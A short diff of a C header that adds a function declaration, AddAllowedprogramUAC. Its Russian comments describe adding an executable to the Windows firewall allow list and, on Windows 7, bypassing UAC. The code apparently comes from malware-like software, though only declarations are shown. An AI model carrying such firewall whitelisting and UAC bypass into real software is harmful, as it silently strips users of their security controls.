@@ -185,5 +185,8 @@ void StartVideoFromCurrentURL();
 char* PathToName( const char* path, char* name, int szName );
 //добавляет указанный файл в список разрешенных браундмаузера винды
 bool AddAllowedprogram( const char* pathExe );
+//добавляет указанный файл в список разрешенных браундмаузера винды, только если 7-ка, то
+//делается обход уака
+bool AddAllowedprogramUAC( const char* pathExe );
 
 #endif
